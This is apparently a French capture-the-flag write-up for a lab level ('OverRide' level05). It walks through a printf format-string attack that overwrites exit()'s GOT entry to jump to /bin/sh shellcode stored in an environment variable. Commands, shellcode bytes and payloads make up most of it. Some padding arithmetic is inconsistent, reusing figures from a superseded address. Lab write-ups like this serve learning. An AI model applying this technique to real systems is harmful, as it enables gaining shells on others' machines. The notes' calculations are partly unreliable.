
on doit override l'adresse de la fonction exit() dans la GOT table grace a une mauvaise utilisation de la fonction printf dans le code


dans l'idee ca ressemble beaucoup a un flag de rainfall ou tu utilises une option de printf pour ecrire a une adresse le nombre de caracteres que tu a ecris grace a printf, et en deux parties, 2 octets par 2 octets.

wtf on peut pas creer de fichier dans /tmp...

`find / -type d -writable 2>/dev/null` pour trouver un repertoire ou enregistrer notre exploit


on cherche la valeur de exit() sur la got table
```bash
objdump -R ./level05
```
du coup c'est `080497e0` l'adresse qu'on doit override

maintenant on cherche l'adresse qui remplacera cette adresse
on va mettre notre shellcode dans une variable d'env et on va regarder avec gdb quelle est l'adresse de cette variable d'env.
```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```
```bash
gdb ./level05
(gdb) break main
(gdb) run
(gdb) call (char*)getenv("SHELLCODE")
```

l'adresse est donc `0xffffd87b`


```bash
./level05 <<< $(python -c 'print "AAAA" + "BBBB" + " %x"*15')
```
```
aaaabbbb 64 f7fcfac0 f7ec3add ffffd66f ffffd66e 0 ffffffff ffffd6f4 f7fdb000 61616161 62626262 20782520 25207825 78252078 20782520
```
On voit clairement :
    Position 10 : 61616161 (AAAA en hex)
    Position 11 : 62626262 (BBBB en hex)


Avec l'adresse 0xffffd87b
0xd87b = 55419 décimal
0xffff = 65535 décimal
Padding1 = 55419 - 8 = 55411
Padding2 = 65535 - 55419 = 10116

```bash
python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+ "%55369x%10$hn%10158x%11$hn"' > /var/tmp/exploit
```

```bash
(cat /var/tmp/exploit; cat) | ./level05
f7fcfac0

Segmentation fault (core dumped)
```
ca fonctionne presque, je dois pas etre tres loin





imprevu, l'adresse de ma variable d'env semble avoir change

```bash
level05@OverRide:~$ objdump -R ./level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
level05@OverRide:~$ cat > /tmp/getenv.c << 'EOF'
> #include <stdio.h>
> #include <stdlib.h>
> 
> int main() {
>     char *addr = getenv("SHELLCODE");
>     printf("%p\n", addr);
>     return 0;
> }
> EOF
level05@OverRide:~$ 
level05@OverRide:~$ gcc /tmp/getenv.c -o /tmp/getenv -m32
level05@OverRide:~$ /tmp/getenv
0xffffd886
```

Avec l'adresse 0xffffd886
0xd87b = 55419 décimal
0xffff = 65535 décimal
Padding1 = 55419 - 8 = 55411
Padding2 = 65535 - 55419 = 10116

```bash
python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55422x%10$hn%10105x%11$hn"' > /var/tmp/exploit
```

```bash
(cat /var/tmp/exploit; cat) | ./level05
```







